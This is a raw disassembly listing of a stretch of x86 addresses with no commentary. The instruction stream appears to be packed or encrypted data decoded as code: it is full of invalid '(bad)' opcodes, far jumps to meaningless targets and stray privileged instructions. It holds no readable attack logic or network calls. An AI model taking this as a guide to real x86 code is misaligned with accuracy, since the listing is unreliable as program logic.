  414e98:	jle    0x414f09
  414e9a:	pop    es
  414e9b:	adc    eax,0xd1fcb9a7
  414ea0:	(bad)  
  414ea2:	jo     0x414eb5
  414ea4:	mov    dh,0x91
  414ea6:	adc    ecx,edx
  414ea8:	call   0x55b5695d
  414ead:	mov    gs,ebx
  414eaf:	or     al,0xe7
  414eb1:	and    ecx,ecx
  414eb3:	jge    0x414e90
  414eb5:	adc    esi,edx
  414eb7:	cwde   
  414eb8:	mov    esi,0x8fcfe90d
  414ebd:	jmp    0x24fc:0x1d1766d3
  414ec4:	ss pop edi
  414ec6:	shl    DWORD PTR [ebx],1
  414ec8:	hlt    
  414ec9:	ins    DWORD PTR es:[edi],dx
  414eca:	jge    0x414f12
  414ecc:	hlt    
  414ecd:	in     eax,0x47
  414ecf:	inc    ebp
  414ed0:	inc    ebp
  414ed1:	add    BYTE PTR [esi],ch
  414ed3:	pop    ss
  414ed4:	ss gs jo 0x414f55
  414ed8:	outs   dx,DWORD PTR ds:[esi]
  414ed9:	inc    edi
  414eda:	mov    dl,0xaf
  414edc:	call   FWORD PTR [edi+0x50]
  414edf:	mov    ds:0x941f66a4,al
  414ee4:	push   edi
  414ee5:	sbb    dl,ch
  414ee7:	pop    esi
  414ee8:	xor    esi,DWORD PTR [esi+0x50]
  414eeb:	in     eax,0x11
  414eed:	retf   
  414eee:	gs loop 0x414f57
  414ef1:	xor    edi,DWORD PTR [esi+0x76e9be7f]
  414ef7:	mov    eax,0xb6e212e4
  414efc:	adc    ebp,esp
  414efe:	cmp    BYTE PTR [ebp+0x1b],dh
  414f01:	jl     0x414f43
  414f03:	lahf   
  414f04:	js     0x414f39
  414f06:	cmp    BYTE PTR [ecx],dl
  414f08:	and    ch,BYTE PTR [edi]
  414f0a:	xchg   ebx,eax
  414f0b:	jge    0x414ef8
  414f0d:	mov    ebx,0xb2ceee
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0x60b49150
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x48000001
  414f8d:	js     0x414f48
  414f8f:	mov    al,0x2e
  414f91:	iret   
  414f92:	dec    ecx
  414f93:	or     BYTE PTR [eax+0x619873c9],ah
  414f99:	(bad)  
  414f9a:	aas    
  414f9b:	aaa    
  414f9c:	xchg   esp,eax
  414f9d:	fld    TBYTE PTR [eax+0x6b0f2]
  414fa3:	jae    0x414f5e
  414fa5:	cwde   
  414fa6:	sbb    eax,esi
  414fa8:	mov    DWORD PTR [esi+ebx*4],esi
  414fab:	and    DWORD PTR [eax-0x2682a933],esp
  414fb1:	int    0xfb
  414fb3:	loope  0x414f5f
  414fb5:	xchg   ebx,eax
  414fb6:	outs   dx,DWORD PTR ds:[esi]
  414fb7:	adc    al,0xe9
  414fb9:	stos   DWORD PTR es:[edi],eax
  414fba:	lea    ecx,ss:[eax+0x471d112e]
  414fc1:	in     eax,0x9a
  414fc3:	cmp    esi,edx
  414fc5:	mov    eax,ds:0xd7ab278
  414fca:	icebp  
  414fcb:	push   ecx
  414fcc:	hlt    
  414fcd:	popf   
  414fce:	xor    BYTE PTR [eax-0x13b68c3f],bl
  414fd4:	les    esp,FWORD PTR [edx+ebx*8]
  414fd7:	jae    0x414fc4
  414fd9:	imul   edx,DWORD PTR [edi+0x55],0xb2851b0
  414fe0:	(bad)  
  414fe1:	xlat   BYTE PTR ds:[ebx]
  414fe2:	jmp    0x7332:0x7067c3ae
  414fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fea:	(bad)  
  414feb:	je     0x414f96
  414fed:	jl     0x41503f
  414fef:	add    al,0x2b
  414ff1:	and    al,BYTE PTR [ebx+0x33c6c02a]
  414ff7:	cmp    DWORD PTR [edx-0x2d],0x605ecad7
  414ffe:	xchg   edx,eax
  414fff:	xor    eax,0xc3a3d787
  415004:	push   es
  415005:	arpl   ax,ax
  415007:	or     BYTE PTR [ecx+eax*1-0x71],cl
  41500b:	jmp    0x2a50:0xa1aee97f
  415012:	pop    edi
  415013:	mov    al,0x60
  415015:	or     eax,0x59cf967e
  41501a:	adc    al,0x74
  41501c:	sbb    bh,ch
  41501e:	in     eax,dx
  41501f:	(bad)  
  415020:	jmp    0x31de8002
  415025:	adc    cl,BYTE PTR [ebx+ebp*1-0x7fbb7a13]
  41502c:	pop    es
  41502d:	xchg   edx,eax
  41502e:	das    
  41502f:	xlat   BYTE PTR ds:[ebx]
  415030:	aad    0x5f
  415032:	mov    dh,0x9a
  415034:	fist   WORD PTR [esi+ebp*2-0x34d95ce0]
  41503b:	push   esi
  41503c:	ret    
  41503d:	mov    bl,0xf2
  41503f:	imul   esi,eax,0xfbcb4a9f
  415045:	stc    
  415046:	dec    ebx
  415047:	gs pushf 
  415049:	(bad)  
  41504a:	in     eax,0xd
  41504c:	sub    eax,0x28ebfea8
  415051:	cmc    
  415052:	ret    0xa73
  415055:	pop    edi
  415056:	xchg   ebx,eax
  415057:	(bad)  
  415058:	lods   eax,DWORD PTR ds:[esi]
  415059:	jle    0x41504d
  41505b:	xchg   esi,eax
  41505c:	adc    esi,DWORD PTR [edx]
  41505e:	rcr    ah,1
  415060:	mov    WORD PTR [eax+edi*4],ss
  415063:	jmp    0x8262:0x8923574c
  41506a:	outs   dx,BYTE PTR ds:[esi]
  41506b:	(bad)  
  41506c:	cmc    
  41506d:	out    dx,al
  41506e:	iret   
  41506f:	(bad)  
  415071:	dec    esi
  415072:	popa   
  415073:	pop    ss
  415074:	sbb    DWORD PTR [ebp-0x539cf45c],esp
  41507a:	arpl   WORD PTR [ebp+esi*1+0x1d9a180],di
  415081:	iret   
  415082:	fbld   TBYTE PTR [ecx+edx*1+0x26]
  415086:	or     al,0x77
  415088:	mov    ch,0xe9
  41508a:	pop    es
  41508b:	xchg   DWORD PTR ds:0xcf783b8e,edi
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xf53cfc2d
  415102:	out    0x66,al
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0x1000001
  41510d:	cld    
  41510e:	mov    esi,0xdad36458
  415113:	int3   
  415114:	sbb    BYTE PTR [esi],dl
  415116:	jnp    0x415139
  415118:	dec    esp
  415119:	and    edi,esp
  41511b:	in     eax,dx
  41511c:	ds xor esp,edx
  41511f:	pop    ds
  415120:	push   esi
  415121:	mov    BYTE PTR [eax],al
  415123:	stos   DWORD PTR es:[edi],eax
  415124:	test   ecx,ecx
  415126:	ficom  DWORD PTR [ebx-0x2]
  415129:	cmp    eax,0xd7486b36
  41512e:	adc    ch,dh
  415130:	mov    ds:0xa20acfc3,eax
  415135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415136:	(bad)  
  415137:	push   esp
  415138:	mov    ch,0xbe
  41513a:	daa    
  41513b:	dec    ebx
  41513c:	push   edx
  41513d:	enter  0x1df0,0x28
  415141:	inc    ebp
  415142:	das    
  415143:	test   eax,0x7550ec7f
  415148:	xor    BYTE PTR [ebx],dl
  41514a:	gs jmp 0x2048:0x6d8c076a
  415152:	dec    edi
  415153:	lods   al,BYTE PTR ds:[esi]
  415154:	add    eax,DWORD PTR [edx+0x6c3c49ce]
  41515a:	test   eax,0x3da8809d
  41515f:	je     0x4151a1
  415161:	out    0xb0,eax
  415163:	xchg   edx,eax
  415164:	mov    esi,0x196db7a
  415169:	push   esi
  41516a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41516c:	dec    eax
  41516d:	push   ebx
  41516e:	ja     0x4150f7
  415170:	push   esp
  415171:	xchg   ecx,eax
  415172:	add    al,0xad
  415174:	cli    
  415175:	inc    edx
  415176:	add    ecx,esi
  415178:	jnp    0x4151ac
  41517a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41517b:	push   ds
  41517c:	loop   0x4151eb
  41517e:	shr    BYTE PTR [ebp+0x71],1
  415181:	or     eax,0xd641cdfa
  415186:	push   ebp
  415187:	out    0xb6,al
  415189:	jmp    0x415149
  41518b:	xor    cl,ch
  41518d:	and    al,0x10
  41518f:	ins    BYTE PTR es:[edi],dx
  415190:	and    edx,DWORD PTR [eax-0x1c06ef7d]
  415196:	outs   dx,DWORD PTR ds:[esi]
  415197:	push   eax
  415198:	jmp    0x415208
  41519a:	mov    ah,dl
  41519c:	adc    bl,cl
  41519e:	pushf  
  41519f:	xor    ecx,eax
  4151a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a2:	mov    eax,es
  4151a4:	mov    ss:0x76aec8a5,eax
  4151aa:	jle    0x41519c
  4151ac:	mov    dh,0x7c
  4151ae:	retf   0x8624
  4151b1:	jb     0x41513a
  4151b3:	icebp  
  4151b4:	adc    al,0x7e
  4151b6:	or     eax,0x8b489c35
  4151bb:	xor    BYTE PTR [ebp-0x41],dl
  4151be:	push   ss
  4151bf:	icebp  
  4151c0:	cmp    esp,DWORD PTR [esi-0x1aef70db]
  4151c6:	fsubr  DWORD PTR [edi+0x17118c37]
  4151cc:	hlt    
  4151cd:	mov    dh,0x32
  4151cf:	sti    
  4151d0:	imul   ebx,DWORD PTR [esi-0x41],0x63b0966c
  4151d7:	ins    BYTE PTR es:[edi],dx
  4151d8:	pop    esp
  4151d9:	jg     0x415236
  4151db:	les    edi,FWORD PTR [esi-0x422220f9]
  4151e1:	xor    eax,0xa20022a3
  4151e6:	adc    eax,0x8adbd3e0
  4151eb:	pop    ebp
  4151ec:	call   0x8c92b369
  4151f1:	cmp    eax,0xa458c2e2
  4151f6:	mov    ch,0xf0
  4151f8:	xchg   ebp,eax
  4151f9:	retw   
  4151fb:	push   0x1031a76
  415200:	add    eax,0xee4cf553
  415205:	pop    edi
  415206:	adc    ecx,esi
  415208:	ss pusha 
  41520a:	retf   
  41520b:	sbb    al,0x7e
  41520d:	sti    
  41520e:	push   ebx
  41520f:	mov    edi,DWORD PTR [ecx]
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x329fb40b
  415283:	gs sbb eax,0x50000df
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    BYTE PTR ds:0xa880d174,ah
  415291:	sti    
  415292:	adc    DWORD PTR [eax],eax
  415294:	(bad)  
  415296:	cs mov esp,0x7e6df2ac
  41529c:	pop    esp
  41529d:	shl    DWORD PTR [eax+0x34a3ec93],1
  4152a3:	dec    ebx
  4152a4:	mov    edx,0x66683a5e
  4152a9:	mov    ch,0x61
  4152ab:	mov    BYTE PTR ds:0xe85e301f,ah
  4152b1:	stos   DWORD PTR es:[edi],eax
  4152b2:	sti    
  4152b3:	int3   
  4152b4:	lea    ecx,[ebx-0x7f655fa5]
  4152ba:	or     al,0x1c
  4152bc:	adc    eax,0xbc9865c9
  4152c1:	scas   al,BYTE PTR es:[edi]
  4152c2:	sar    BYTE PTR [ecx+0x21],cl
  4152c5:	cmp    BYTE PTR [edi+0x6e],ah
  4152c8:	jnp    0x4152ed
  4152ca:	fs es xchg ebx,eax
  4152cd:	sub    eax,DWORD PTR [eax-0x12]
  4152d0:	cld    
  4152d1:	fmul   QWORD PTR [ecx+0x29]
  4152d4:	out    0x7b,eax
  4152d6:	mov    dh,0xcd
  4152d8:	jo     0x415307
  4152da:	mov    DWORD PTR [ecx+0x2e],ebx
  4152dd:	out    0xf3,eax
  4152df:	sbb    eax,0xc9110541
  4152e4:	add    eax,0x918b9f5d
  4152e9:	pop    ds
  4152ea:	shl    BYTE PTR [edi+ecx*1],1
  4152ed:	sar    DWORD PTR [edx+0x2d],cl
  4152f0:	dec    esi
  4152f1:	pop    eax
  4152f2:	lods   al,BYTE PTR ds:[esi]
  4152f3:	out    dx,eax
  4152f4:	pop    ds
  4152f5:	or     ah,BYTE PTR [esi]
  4152f7:	inc    ecx
  4152f8:	je     0x415370
  4152fa:	add    eax,0xca722dc2
  4152ff:	jle    0x4152cd
  415301:	sbb    esi,ecx
  415303:	cmp    DWORD PTR [eax-0x70],0xdcef43e5
  41530a:	(bad)  [edx-0x1a]
  41530d:	sti    
  41530e:	dec    eax
  41530f:	dec    esi
  415310:	jl     0x4152f2
  415312:	add    DWORD PTR [ebx-0x10],edx
  415315:	fsubr  DWORD PTR [esi]
  415317:	jp     0x415311
  415319:	(bad)  
  41531a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41531b:	jg     0x4152e4
  41531d:	fs pop es
  41531f:	test   al,0xbf
  415321:	std    
  415322:	lock icebp 
  415324:	xchg   BYTE PTR [edi-0x9bf46e3],bh
  41532a:	jns    0x4152fd
  41532c:	sbb    BYTE PTR [ebp-0x10],ah
  41532f:	jae    0x415374
  415331:	mov    bh,0x17
  415333:	adc    al,0xd9
  415335:	sbb    bh,BYTE PTR [ebp+0x4d5cd88f]
  41533b:	mov    ebx,0xa3fa1c81
  415340:	out    dx,al
  415341:	fs adc bh,al
  415344:	mov    WORD PTR [eax+eax*8],gs
  415347:	xor    eax,0xe25cbecd
  41534c:	js     0x41535f
  41534e:	pop    es
  41534f:	jp     0x41532b
  415351:	out    dx,al
  415352:	pop    ebp
  415353:	adc    eax,0x6c5e0f30
  415358:	inc    edx
  415359:	faddp  st(4),st
  41535b:	lds    edx,FWORD PTR [edi+0x75]
  41535e:	inc    edi
  41535f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415360:	or     al,0xdf
  415362:	xor    edx,ebp
  415364:	cwde   
  415365:	push   cs
  415366:	mov    al,0x20
  415368:	sbb    al,0xb6
  41536a:	mov    dl,0x3c
  41536c:	mov    WORD PTR [eax],?
  41536e:	pop    es
  41536f:	(bad)  
  415370:	jo     0x415395
  415372:	or     DWORD PTR [ebp+0x7aac6522],0x6d46a514
  41537c:	rcr    DWORD PTR [ecx+0x23],0x18
  415380:	stos   BYTE PTR es:[edi],al
  415381:	sbb    al,0xcc
  415383:	pop    ss
  415384:	and    al,0xb5
  415386:	jecxz  0x4153f9
  415388:	ret    0xdeb0
  41538b:	adc    al,bl
  41538d:	scas   al,BYTE PTR es:[edi]
  41538e:	and    DWORD PTR [ebp+0x18],edi
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x1dd3e5b0
  415401:	mov    al,ds:0xe022b84b
  415406:	add    BYTE PTR [eax],al
  415408:	add    eax,0xb8000001
  41540d:	sbb    edx,ecx
  41540f:	or     eax,0xc8390b24
  415414:	push   0x64e13208
  415419:	sti    
  41541a:	or     BYTE PTR [esi+0x59],dh
  41541d:	pop    ds
  41541e:	sub    DWORD PTR [edi-0x2ace6484],0x33d52362
  415428:	cld    
  415429:	mov    al,BYTE PTR [ebp-0x54268e79]
  41542f:	pusha  
  415430:	ins    DWORD PTR es:[edi],dx
  415431:	popa   
  415432:	jnp    0x415450
  415434:	mov    al,0x4
  415436:	mov    ds:0x2b28e03c,eax
  41543b:	xor    DWORD PTR ds:0x3b3a5d2d,edx
  415441:	cs push 0xffffffeb
  415444:	or     cl,BYTE PTR [edx+0x2c08a066]
  41544a:	xor    eax,0x7a715281
  41544f:	sub    DWORD PTR [bp+si],edx
  415452:	in     al,0xb5
  415454:	or     al,0x63
  415456:	or     dh,BYTE PTR [ebp+edx*2-0xfcff97d]
  41545d:	sub    BYTE PTR [edi],ah
  41545f:	cmp    eax,DWORD PTR [ecx+0x69520a66]
  415465:	mov    dh,0xab
  415467:	idiv   al
  415469:	jle    0x41549c
  41546b:	scas   al,BYTE PTR es:[edi]
  41546c:	cli    
  41546d:	rcr    BYTE PTR [eax],0xb2
  415470:	aad    0x92
  415472:	sub    DWORD PTR [ebx],ebx
  415474:	xlat   BYTE PTR ds:[ebx]
  415475:	adc    edx,edx
  415477:	xor    dl,BYTE PTR [esi]
  415479:	test   BYTE PTR [ecx],ah
  41547b:	push   ebx
  41547c:	cmp    ebx,DWORD PTR [ebp+0x20]
  41547f:	mov    ds:0x1cbd40fe,eax
  415484:	clc    
  415485:	adc    dl,0xeb
  415488:	or     BYTE PTR [edx-0x4fdda1ab],al
  41548e:	pop    ebx
  41548f:	or     bh,BYTE PTR [ebx-0x4461a26e]
  415495:	xchg   edx,eax
  415496:	push   ss
  415497:	lods   eax,DWORD PTR ds:[esi]
  415498:	sub    BYTE PTR [ebx],0x59
  41549b:	cmp    DWORD PTR [edx],eax
  41549d:	jmp    0x2e4011a8
  4154a2:	and    esi,ebx
  4154a4:	add    dl,dl
  4154a6:	retf   0xd081
  4154a9:	adc    esp,edx
  4154ab:	dec    edx
  4154ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ad:	fcom   DWORD PTR [eax-0x7f79b4dd]
  4154b3:	lods   eax,DWORD PTR ds:[esi]
  4154b4:	nop
  4154b5:	jns    0x415516
  4154b7:	inc    ebp
  4154b8:	leave  
  4154b9:	jno    0x4154d8
  4154bb:	hlt    
  4154bc:	push   esi
  4154bd:	std    
  4154be:	mov    ss,WORD PTR [esi+0x6a4eccfa]
  4154c4:	jmp    0x415544
  4154c6:	xor    eax,0x2c42626
  4154cb:	popa   
  4154cc:	data16 je 0x41552a
  4154cf:	pop    esp
  4154d0:	adc    edi,DWORD PTR [edx+0x144d38bd]
  4154d6:	lods   al,BYTE PTR ds:[esi]
  4154d7:	sub    esp,DWORD PTR [edi-0x77839e27]
  4154dd:	(bad)  
  4154de:	setae  BYTE PTR [edi+0x5e]
  4154e2:	mov    ecx,0xb06aac7d
  4154e7:	in     al,dx
  4154e8:	inc    eax
  4154e9:	mov    cl,0xb
  4154eb:	inc    edi
  4154ec:	xor    BYTE PTR [ecx+edx*2+0x2fffbe7],0xec
  4154f4:	jp     0x4154d5
  4154f6:	push   esi
  4154f7:	jmp    0x98f30129
  4154fc:	lahf   
  4154fd:	mov    esi,0x165d1ec2
  415502:	clc    
  415503:	pusha  
  415504:	inc    eax
  415505:	sbb    BYTE PTR [edi+0x20],bh
  415508:	and    DWORD PTR [esi],esp
  41550a:	lods   eax,DWORD PTR ds:[esi]
  41550b:	frstor [edx+0x27]
  41550e:	stos   BYTE PTR es:[edi],al
  41550f:	push   eax
  415510:	dec    ecx
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415570
  415581:	outs   dx,DWORD PTR ds:[esi]
  415582:	ret    
  415583:	call   0x105:0xe127
  41558a:	add    BYTE PTR [eax],al
  41558c:	mov    ebp,0x133360d2
  415591:	ja     0x41555f
  415593:	sti    
  415594:	push   ss
  415595:	mov    eax,0x8c53729d
  41559a:	mov    ds,WORD PTR [ebp+esi*8-0x40]
  41559e:	sub    DWORD PTR cs:[ebx+ebx*8-0x2e],ebp
  4155a3:	push   esp
  4155a4:	and    eax,DWORD PTR [ebp+0xb9db532]
  4155aa:	test   BYTE PTR [ecx],al
  4155ac:	jno    0x41557d
  4155ae:	jmp    0x5122:0x1c450491
  4155b5:	ins    BYTE PTR es:[edi],dx
  4155b6:	jnp    0x4155f1
  4155b8:	in     eax,dx
  4155b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ba:	mov    bl,0x5b
  4155bc:	imul   ebx,DWORD PTR [edx],0x6d87965a
  4155c2:	sbb    eax,0x6f0675b
  4155c7:	jge    0x415557
  4155c9:	aam    0xfb
  4155cb:	dec    esi
  4155cc:	mov    bl,0x8b
  4155ce:	out    dx,al
  4155cf:	adc    eax,0xec6f8617
  4155d4:	adc    edx,0xe982d64e
  4155da:	ret    0x353b
  4155dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155de:	mov    al,0x7a
  4155e0:	sbb    eax,0x44dea308
  4155e5:	jno    0x415626
  4155e7:	and    eax,0xd3437d01
  4155ec:	sahf   
  4155ed:	fadd   QWORD PTR [ebx]
  4155ef:	(bad)  
  4155f0:	call   0xb9dc:0x1587ab21
  4155f7:	lock jp 0x41565d
  4155fa:	push   cs
  4155fb:	sahf   
  4155fc:	or     al,ah
  4155fe:	and    BYTE PTR gs:[esi-0x54],al
  415602:	scas   al,BYTE PTR es:[edi]
  415603:	cld    
  415604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415605:	out    0xe8,eax
  415607:	fwait
  415608:	outs   dx,BYTE PTR ds:[esi]
  415609:	jmp    0x4155ed
  41560b:	mov    al,ds:0x841deec4
  415610:	retf   
  415611:	xchg   edi,eax
  415612:	or     al,0x71
  415614:	add    edi,DWORD PTR [ecx*1+0x489dd752]
  41561b:	shl    ebx,1
  41561d:	mov    esi,ebp
  41561f:	add    ebp,DWORD PTR [ebx]
  415621:	pusha  
  415622:	inc    ebx
  415623:	pop    ebx
  415624:	jp     0x4155f8
  415626:	stos   DWORD PTR es:[edi],eax
  415627:	add    esi,esp
  415629:	jl     0x415615
  41562b:	scas   eax,DWORD PTR es:[edi]
  41562c:	and    eax,edi
  41562e:	enter  0xcc0b,0x96
  415632:	push   edi
  415633:	shl    ecx,0x14
  415636:	or     DWORD PTR [edi+0x15],edi
  415639:	aas    
  41563a:	mov    bh,0xb6
  41563c:	rol    DWORD PTR [edx-0x68ecf904],cl
  415642:	xor    al,BYTE PTR [eax+0x21]
  415645:	jmp    0x4c8f:0xf6842905
  41564c:	(bad)  
  41564d:	cmp    bh,BYTE PTR [ebx-0x5f]
  415650:	push   ds
  415651:	mov    cl,0x68
  415653:	ja     0x415638
  415655:	pop    ecx
  415656:	fidiv  WORD PTR [ebp+0x79d3da74]
  41565c:	hlt    
  41565d:	adc    eax,0x6ac47a31
  415662:	(bad)  
  415663:	iret   
  415664:	outs   dx,BYTE PTR ds:[esi]
  415665:	jmp    0x49a5:0x7262715c
  41566c:	out    0x9a,al
  41566e:	adc    BYTE PTR [ecx+0x1512ca6d],ah
  415674:	mov    edi,0xb76a34a1
  415679:	test   edi,esi
  41567b:	or     DWORD PTR [esi+0x6bdc6838],edx
  415681:	lock sbb DWORD PTR [ebx+eiz*1+0x5a348fa1],ecx
  415689:	mov    edx,0x4cbe6e2
  41568e:	push   eax
  41568f:	mov    al,ds:0x85
	...
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xbf
  415701:	cwde   
  415702:	xchg   ecx,eax
  415703:	popf   
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0xde000001
  41570d:	add    DWORD PTR [edx],0x74
  415710:	call   0xb9d869e0
  415715:	fcom   QWORD PTR fs:[edx-0x2c0acdde]
  41571c:	popf   
  41571d:	dec    esp
  41571e:	add    DWORD PTR ds:0xcd6fcf33,ebp
  415724:	or     DWORD PTR [esi],ebx
  415726:	loopne 0x415741
  415728:	sub    DWORD PTR [edx+ecx*1+0x6d6a0178],edi
  41572f:	fcom   DWORD PTR [ecx-0x6]
  415732:	rcl    DWORD PTR [edx-0x65],cl
  415735:	mov    bh,0x69
  415737:	out    dx,eax
  415738:	das    
  415739:	jae    0x415765
  41573b:	jmp    0x3b8d9cae
  415740:	add    cl,ah
  415742:	sub    dl,BYTE PTR [edi-0x3c841c61]
  415748:	xchg   DWORD PTR [edi+0x65],edx
  41574b:	mov    ebp,0x8acd6608
  415750:	(bad)  
  415751:	ss imul ebp,ecx,0xffffffd5
  415755:	sbb    BYTE PTR [ebx-0x4a],cl
  415758:	push   eax
  415759:	stos   DWORD PTR es:[edi],eax
  41575a:	icebp  
  41575b:	adc    eax,DWORD PTR [ecx-0x37]
  41575e:	xchg   edx,eax
  41575f:	dec    BYTE PTR [esi]
  415761:	and    eax,0xd449e11f
  415766:	jns    0x415769
  415768:	push   ebx
  415769:	std    
  41576a:	cmc    
  41576b:	nop
  41576c:	xor    al,0xe
  41576e:	mov    WORD PTR [ebx+0x477645bc],fs
  415774:	jno    0x41573b
  415776:	dec    edi
  415777:	xchg   edx,eax
  415778:	add    DWORD PTR [ecx-0x4c],edi
  41577b:	repnz in al,0x4d
  41577e:	dec    edi
  41577f:	(bad)  
  415780:	sub    DWORD PTR ds:0xd83a64cd,eax
  415786:	push   edi
  415787:	xor    cl,BYTE PTR [ebx-0x25]
  41578a:	test   al,0xf4
  41578c:	jp     0x4157b1
  41578e:	cli    
  41578f:	mov    esi,0x8170ff1
  415794:	mov    BYTE PTR [edx+0x72660bcc],0x5c
  41579b:	pop    ds
  41579c:	mov    bl,0x90
  41579e:	imul   edx,DWORD PTR [ebp+0x12ec6c31],0xffffffff
  4157a5:	cli    
  4157a6:	jns    0x4157b6
  4157a8:	jae    0x415754
  4157aa:	sub    bh,dl
  4157ac:	test   BYTE PTR [edx+0x1f],0xd1
  4157b0:	inc    ebp
  4157b1:	sub    eax,0xb66d22f0
  4157b6:	xor    eax,0x580b5bdd
  4157bb:	mov    esi,0x2c171923
  4157c0:	ret    0x3c8f
  4157c3:	xor    eax,0x4fd0ca91
  4157c8:	xchg   ecx,eax
  4157c9:	pusha  
  4157ca:	sbb    eax,0x778d1692
  4157cf:	lea    esi,[eax*4-0x510a7a92]
  4157d6:	and    eax,0x866ab86e
  4157db:	rcr    dl,0x4
  4157de:	loope  0x4157e5
  4157e0:	repnz adc BYTE PTR [esi],0x5
  4157e4:	push   eax
  4157e5:	jae    0x415861
  4157e7:	add    esp,ebx
  4157e9:	and    ecx,DWORD PTR [ecx+0xbbfe05c]
  4157ef:	pop    esi
  4157f0:	ins    BYTE PTR es:[edi],dx
  4157f1:	or     al,0xfe
  4157f3:	div    DWORD PTR [eax+0x27]
  4157f6:	add    BYTE PTR [edi+0x524f0c15],al
  4157fc:	arpl   WORD PTR [edx],di
  4157fe:	pop    edx
  4157ff:	lahf   
  415800:	add    ax,0xb5b0
  415804:	fwait
  415805:	addr16 test eax,0x6e80ca00
  41580b:	repz retf 
  41580d:	jge    0x415872
  41580f:	pop    ds
  415810:	jo     0x415812
	...
  415872:	add    BYTE PTR [eax],al
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shl    eax,cl
  415881:	xchg   esp,eax
  415882:	retf   0x3107
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR ds:0x2e000001,al
  41588d:	xor    al,0xdd
  41588f:	int    0x19
  415891:	mov    ds:0xd5cc8c4d,al
  415896:	xor    BYTE PTR [esi+0x65],dl
  415899:	inc    ecx
  41589a:	mov    esi,0xbc9e5d73
  41589f:	or     DWORD PTR [edx+0x17],ecx
  4158a2:	into   
  4158a3:	stos   DWORD PTR es:[edi],eax
  4158a4:	adc    edx,DWORD PTR [edi]
  4158a6:	cli    
  4158a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a8:	lods   eax,DWORD PTR ds:[esi]
  4158a9:	or     dl,BYTE PTR [ebx-0x72]
  4158ac:	adc    al,0xdf
  4158ae:	and    BYTE PTR [ebx+0x79],bh
  4158b1:	sbb    al,0x7d
  4158b3:	in     eax,dx
  4158b4:	jl     0x4158da
  4158b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b7:	cdq    
  4158b8:	sub    edx,esp
  4158ba:	jecxz  0x415845
  4158bc:	out    dx,eax
  4158bd:	stos   DWORD PTR es:[edi],eax
  4158be:	cmp    al,0xcc
  4158c0:	dec    ecx
  4158c1:	xchg   DWORD PTR [ebp-0x524fd767],esi
  4158c7:	add    ebx,DWORD PTR [ebx]
  4158c9:	cmp    DWORD PTR [edx],ebp
  4158cb:	test   cl,al
  4158cd:	pop    ss
  4158ce:	adc    DWORD PTR [eax],ecx
  4158d0:	in     eax,0x34
  4158d2:	sbb    BYTE PTR [eax-0xf6dace9],cl
  4158d8:	or     dh,dh
  4158da:	rcl    esi,0x9c
  4158dd:	into   
  4158de:	imul   eax,DWORD PTR [ecx],0x87592c96
  4158e4:	pop    ebp
  4158e5:	push   ebx
  4158e6:	dec    edi
  4158e7:	test   BYTE PTR [edi],al
  4158e9:	xchg   esp,eax
  4158ea:	mov    dh,0xe
  4158ec:	dec    esi
  4158ed:	out    0x87,al
  4158ef:	push   di
  4158f1:	(bad)  
  4158f2:	bound  ebp,QWORD PTR [edi+0x55e11a7b]
  4158f8:	sub    al,0xf4
  4158fa:	jmp    0xd118:0x885f2059
  415901:	in     eax,0x66
  415903:	mov    edx,0x845fb910
  415908:	int    0xb1
  41590a:	popa   
  41590b:	data16 mov ds:0x2f4e62b8,al
  415911:	rol    BYTE PTR [ecx-0x6b],1
  415914:	arpl   ax,dx
  415916:	mov    edi,0x3521f282
  41591b:	push   es
  41591c:	arpl   sp,ax
  41591e:	cdq    
  41591f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415920:	sbb    esi,DWORD PTR [eax]
  415922:	ins    BYTE PTR es:[edi],dx
  415923:	adc    al,0x3e
  415925:	ret    0x7bf8
  415928:	fwait
  415929:	jns    0x415959
  41592b:	repnz inc esp
  41592d:	(bad)  
  41592e:	fcmovne st,st(5)
  415930:	inc    ebp
